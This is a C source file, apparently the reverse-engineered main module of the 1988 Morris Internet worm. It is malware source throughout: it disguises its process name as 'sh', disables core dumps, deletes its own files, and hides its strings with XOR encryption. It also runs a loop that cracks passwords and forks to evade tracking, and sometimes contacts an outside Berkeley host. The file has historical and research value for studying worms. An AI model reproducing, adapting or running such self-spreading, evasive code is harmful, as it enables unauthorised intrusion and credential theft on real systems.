/*
 * Copyright (c) 1988 The Regents of the University of California.
 * All rights reserved.
 *
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF THE UNIVERSITY
 * OF CALIFORNIA.  The copyright notice above does not evidence
 * any actual or intended publication of this source code.
 *
 * Copying or redistribution in any form is explicitly forbidden
 * unless prior written permission is obtained from Michael Karels or an
 * authorized representative of the University of California, Berkeley.
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */

#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include <string.h>
#include "types.h"

extern int nobjects;
extern int pleasequit;
extern int nextw;
time_t time();
u_long inet_addr();

main(argc, argv)
	int	argc;
	char	**argv;
{
	int	boot;
	int	f8_unused; /* set but not used */
	time_t	tval;
	int	cnt, cnt2;
	int	iargc;
	struct	rlimit rlim;

	f8_unused = 0;

	/* hide ourselves */
	(void) strcpy(*argv, XS("sh"));		/* mcount+4 */

	srandom(tval = time(&tval));
	
	/* don't drop core */
	rlim.rlim_cur = rlim.rlim_max = 0;
	if (setrlimit(RLIMIT_CORE, &rlim) < 0)
		perror("setrlimit");

	(void) signal(SIGPIPE, SIG_DFL);

	/* if passed -p number, treat number as the pid of the bootstrap */
	boot = 0;
	iargc = 1;
	if (argc > 2 && strcmp(argv[iargc], XS("-p")) == 0) {
		boot = atoi(argv[2]);
		iargc += 2;
	}

	/* read the objects into memory */
	for (cnt = iargc; cnt < argc; cnt++) {
		if (loadobject(argv[cnt]) == 0)
			exit(1);
		/* if boot set, unlink each object after reading it */
		if (boot)
			(void) unlink(argv[cnt]);
	}

	/* if no arguments or l1.c not one of the arguments, quit */
	if (nobjects < 0 || getobjectbyname(XS("l1.c")) == 0)
		exit(1);

	if (boot) {
		/* close all file descriptors */
		for (cnt = 0; cnt < 32; cnt++)
			(void) close(cnt);
		/* unlink me, other files already created? */
		(void) unlink(*argv);
		(void) unlink(XS("sh"));
		(void) unlink(XS("/tmp/.dumb"));
	}

	/* zero out our arguments */
	for (cnt = 1; cnt < argc; cnt++)
		for (cnt2 = 0; argv[cnt][cnt2]; cnt2++)
			argv[cnt][cnt2] = 0;

	/* check network interfaces; fail if no interfaces */
	if (if_init() == 0)
		exit(1);

	/* kill off the bootstrap process that helped start us */
	if (boot != 0) {
		if (getpgrp(getpid()) == boot)
			(void) setpgrp(getpid(), getpid());
		(void) kill(boot, SIGKILL);
	}
	doit();
}

doit()
{
	time_t time1, time2;

	(void) time(&time1);
	srandom(time1);

	time2 = time1;
	if (hg() == 0  && hl() == 0)
		(void) ha();
	/* try to contact server; become server */
	checkother();
	/* if ! (1 in 15) send a dgram to ernie */
	send_message();

	for (;;) {
		/* attempt to crack some passwords */
		cracksome();

		/* spend 30 seconds, attending to clients */
		other_sleep(30);

		/* crack some more */
		cracksome();

		/* hide our tracks (should be more often) */
		if (fork() > 0)
			exit(0);

		/* reinitialize routing/networks */
		if (hg() == 0 && hi() == 0 && ha() == 0)
			(void) hl();

		/* spend 2 minutes, attending to clients */
		other_sleep(120);

		/* if running more than 12 hours clean up host list */
		(void) time(&time1);
		if (time1 - time2 > 43200)
			h_clean();
	
		if (pleasequit && nextw > 10)
			exit(0);
	}
}

/*
 * Decrypt a string, where strings are encrypted by xor with 0x81.
 * Return a pointer into a circular decrypted-strings buffer.
 */
char *
XS(s)
	char *s;
{
	int i, len;
	char *p;
	static char buf[0x2800];
	static int last;

	/*
	 * Will it fit in the space we have left?
	 * If not, recycle.
	 */
	len = strlen(s);
	if (len + 1 > sizeof(buf) - last)
		last = 0;
	p = &buf[last];
	last += len + 1;
	for (i = 0; i < sizeof(buf); i++) {
		if (s[i] == 0)
			break;
		p[i] = s[i] ^ 0x81;
	}
	p[i] = 0;
	return p;
}

/* 0x3dc s_3dc() */
/* if 1 in 15, send a datagram to ernie.berkeley.edu. */
static
send_message()
{
	struct	sockaddr_in sin;
	int	fd;
	char	schar;

	if ((random() % 15) != 7)
		return;

	bzero((char *)&sin, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_port = htons(11357);
	sin.sin_addr.s_addr = inet_addr(XS("128.32.137.13"));

	/* create the socket */
	/* should be: fd = socket(AF_INET, SOCK_DGRAM, 0); */
	fd = socket(AF_INET, SOCK_STREAM, 0); /* XXX */
	if (fd < 0)
		return;

	/* send the packet */
	/* bug -- can't send on an unconnected tcp socket! */
	if (sendto(fd, &schar, sizeof(schar), 0, (struct sockaddr *)&sin,
		   sizeof(sin)) < 0)
		perror("sendto");
	(void) close(fd);
}

/* next is if_init */
